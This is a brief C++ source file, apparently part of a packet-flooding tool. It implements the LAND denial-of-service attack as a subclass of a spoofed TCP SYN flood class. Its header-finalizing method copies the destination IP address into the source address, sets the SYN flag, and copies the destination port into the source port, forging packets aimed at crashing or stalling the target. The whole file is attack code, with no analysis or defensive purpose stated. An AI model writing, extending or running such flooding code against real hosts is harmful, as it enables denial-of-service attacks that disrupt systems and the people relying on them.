#include "land.h"

land::land(std::shared_ptr<Config> config) :
			spoofed_tcp_flood(std::move(config)) {

}

void land::finalize_hdr(tcphdr *tcp, iphdr *ip) {
    ip->saddr = ip->daddr;
    tcp->th_flags = TH_SYN;
    tcp->th_sport = tcp->th_dport;
    spoofed_tcp_flood::finalize_hdr(tcp, ip);
}
